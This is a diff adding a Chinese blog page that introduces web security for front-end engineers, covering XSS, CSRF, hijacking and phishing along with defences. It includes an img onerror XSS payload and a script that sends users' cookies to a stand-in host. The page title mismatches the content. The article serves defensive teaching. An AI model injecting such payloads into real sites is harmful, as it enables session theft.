@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="科技的进步，互联网的日益繁荣，方便了人们的同时，也带来了安全隐患。作为前端工程师，我们应该注意到基本的web安全知识"/>
+
+
+
+
+  <meta name="keywords" content="web安全,XSS," />
+
+
+
+
+  <link rel="alternate" href="/blog/atom.xml" title="Daimor">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/blog/favicon.ico?v=2.4.x" />
+
+
+
+<link rel="canonical" href="https://devilzh.github.io/blog/2017/05/24/浅谈web安全/"/>
+
+
+<meta name="description" content="科技的进步，互联网的日益繁荣，方便了人们的同时，也带来了安全隐患。作为前端工程师，我们应该注意到基本的web安全知识">
+<meta name="keywords" content="web安全,XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用Linux alias命令简化常用操作">
+<meta property="og:url" content="https://devilzh.github.io/blog/2017/05/24/浅谈web安全/index.html">
+<meta property="og:site_name" content="Daimor">
+<meta property="og:description" content="科技的进步，互联网的日益繁荣，方便了人们的同时，也带来了安全隐患。作为前端工程师，我们应该注意到基本的web安全知识">
+<meta property="og:updated_time" content="2017-05-24T04:11:28.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="使用Linux alias命令简化常用操作">
+<meta name="twitter:description" content="科技的进步，互联网的日益繁荣，方便了人们的同时，也带来了安全隐患。作为前端工程师，我们应该注意到基本的web安全知识">
+
+
+<link rel="stylesheet" type="text/css" href="/blog/css/style.css?v=2.4.x" />
+
+
+
+
+
+
+
+<script>
+  var CONFIG = {
+    search: false,
+    searchPath: "/blog/search.xml",
+    fancybox: false,
+    toc: true,
+  }
+</script>
+
+
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?d674b98477f6f6726064fa57594956aa";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+    <title> 使用Linux alias命令简化常用操作 · Daimor </title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/blog/." class="logo">Daimor</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    
+      <a href="/blog/">
+        <li class="mobile-menu-item">
+          
+          
+            Home
+          
+        </li>
+      </a>
+    
+      <a href="/blog/archives/">
+        <li class="mobile-menu-item">
+          
+          
+            Archives
+          
+        </li>
+      </a>
+    
+      <a href="/blog/tags">
+        <li class="mobile-menu-item">
+          
+          
+            Tags
+          
+        </li>
+      </a>
+    
+  </ul>
+</nav>
+
+    <div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/blog/." class="logo">Daimor</a>
+</div>
+
+<nav class="site-navbar">
+  
+    <ul id="menu" class="menu">
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/blog/">
+            
+            
+              首页
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/blog/archives/">
+            
+            
+              归档
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/blog/tags">
+            
+            
+              标签
+            
+          </a>
+        </li>
+      
+      
+    </ul>
+  
+</nav>
+
+      </header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content">
+            
+  
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          使用Linux alias命令简化常用操作
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2017年5月24日
+        </span>
+      </div>
+    </header>
+
+    
+    
+  <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#常见的攻击方式"><span class="toc-text">常见的攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS攻击"><span class="toc-text">XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手段"><span class="toc-text">手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运用示例"><span class="toc-text">运用示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防范"><span class="toc-text">防范</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF攻击"><span class="toc-text">CSRF攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手段-1"><span class="toc-text">手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运用"><span class="toc-text">运用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防范-1"><span class="toc-text">防范</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他方式"><span class="toc-text">其他方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网络劫持攻击"><span class="toc-text">网络劫持攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#控制台注入代码"><span class="toc-text">控制台注入代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#钓鱼"><span class="toc-text">钓鱼</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </div>
+
+
+    <div class="post-content">
+      
+        <h1 id="常见的攻击方式"><a href="#常见的攻击方式" class="headerlink" title="常见的攻击方式"></a>常见的攻击方式</h1><h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><blockquote>
+<p>即跨站脚本攻击(Cross Site Scripting)，主要原理是其允许恶意web用户将代码植入到提供给其它用户使用的页面中。是最常见的安全威胁。</p>
+</blockquote>
+<h3 id="手段"><a href="#手段" class="headerlink" title="手段"></a>手段</h3><ul>
+<li>在用户可以生成数据的表单或者页面中，直接输入脚本，比如社交网站新浪微博，恶意用户发一段包含脚本的状态，其他用户访问到之后，从而造成威胁;</li>
+<li><p>利用img标签+onerror事件;<br>比如用于分享一张图片行为，图片src属性设置为<code>\&quot; onerror=\&quot;javascript:alert(&#39;XSS&#39;);\&quot;</code>最终生成的img便签为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">"javascript:alert('XSS');"</span>/&gt;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>利用url的query参数注入脚本。</p>
+</li>
+</ul>
+<h3 id="运用示例"><a href="#运用示例" class="headerlink" title="运用示例"></a>运用示例</h3><p>通过XSS注入，可以直接获取用户Cookie拿到其登录后的权限，比如注入<br><code>&lt;script&gt;window.open(&#39;http://your.site.com?msg=&#39;+document.Cookie)&lt;/script&gt;</code>这段代码到某网站评论区，其他用户访问到此页面后，直接将他们的Cookie信息发送至实施注入者的server上。</p>
+<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><p>对用户输入字符进行转义，包括但不限于：</p>
+<ul>
+<li>‘&lt;’ 以及 ‘&gt;’ 标签转义为‘&amp;lt’;及’&amp;gt’;（防范HTML片段）；</li>
+<li>反斜杠 ‘\’ 转义， （防范unicode码，比如<code>\u003</code>可以伪装<code>&lt;</code>字符）；</li>
+<li>先转义再使用query参数，更不要对参数直接eval；</li>
+<li>服务器设置对Cookie的<code>httpOnly</code>属性为true，禁止客户端js读写Cookie。</li>
+</ul>
+<h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><blockquote>
+<p>CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。</p>
+</blockquote>
+<h3 id="手段-1"><a href="#手段-1" class="headerlink" title="手段"></a>手段</h3><ul>
+<li>GET请求很简单，直接伪造；</li>
+<li>POST请求可以通过在iframe中伪造表单形式发起攻击.</li>
+</ul>
+<h3 id="运用"><a href="#运用" class="headerlink" title="运用"></a>运用</h3><p>以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……</p>
+<h3 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h3><ul>
+<li>不要违反HTTP规范，对不同的场景使用对应的请求方式访问服务端，不要混用;</li>
+<li>在表单内加入隐藏验证字段，可以是加密过的Cookie/随机字符串等token;</li>
+<li>表单加入验证码机制（用户体验不够好）。</li>
+</ul>
+<h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><h3 id="网络劫持攻击"><a href="#网络劫持攻击" class="headerlink" title="网络劫持攻击"></a>网络劫持攻击</h3><p>比如使VPN, 连接不安全的wifi网络等，http请求经过了中间层，信息可能被劫持导致被攻击。解决方式：</p>
+<ul>
+<li>升级http为https;</li>
+<li>使用不对称加密-即客户端加密，服务端解密的方式。</li>
+</ul>
+<h3 id="控制台注入代码"><a href="#控制台注入代码" class="headerlink" title="控制台注入代码"></a>控制台注入代码</h3><p>比较少见，方式为攻击者诱导用户在控制台粘贴攻击脚本。</p>
+<h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>假冒被攻击网站外观，诱骗用户。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB" target="_blank" rel="external">百度词条-XSS</a><br><a href="https://segmentfault.com/a/1190000006672214#articleHeader5" target="_blank" rel="external">聊一聊WEB前端安全那些事儿</a><br><a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">浅谈CSRF攻击方式</a></p>
+
+      
+    </div>
+
+    
+      
+      
+
+
+
+      
+      
+    
+
+    
+      <footer class="post-footer">
+        
+          <div class="post-tags">
+            
+              <a href="/blog/tags/web安全/">web安全</a>
+            
+              <a href="/blog/tags/XSS/">XSS</a>
+            
+          </div>
+        
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/blog/2017/05/22/尾递归优化/">
+        <span class="next-text nav-default">尾递归与递归问题</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+      </footer>
+    
+
+  </article>
+
+
+          </div>
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>  
+      </main>
+
+      <footer id="footer" class="footer">
+
+  <div class="social-links">
+    
+      
+        
+          <a href="mailto:oilinorll@gmail.com" class="iconfont icon-email" title="email"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="http://weibo.com/oilinor/" class="iconfont icon-weibo" title="weibo"></a>
+        
+      
+    
+      
+    
+      
+    
+    
+    
+  </div>
+
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">
+    
+    &copy; 
+     
+      2015 - 
+    
+    2017
+
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Jon Chung</span>
+  </span>
+</div>
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+
+    
+  
+
+  
+  <script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'https://devilzh.github.io/blog/2017/05/24/浅谈web安全/';
+        this.page.identifier = '2017/05/24/浅谈web安全/';
+        this.page.title = '使用Linux alias命令简化常用操作';
+    };
+    (function() {
+    var d = document, s = d.createElement('script');
+
+    s.src = '//jonchung.disqus.com/embed.js';
+
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();  
+  </script>
+
+  
+
+
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/blog/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/blog/lib/slideout/slideout.js"></script>
+  
+
+  
+
+
+    <script type="text/javascript" src="/blog/js/src/even.js?v=2.4.x"></script>
+<script type="text/javascript" src="/blog/js/src/bootstrap.js?v=2.4.x"></script>
+
+    
+  </body>
+</html>
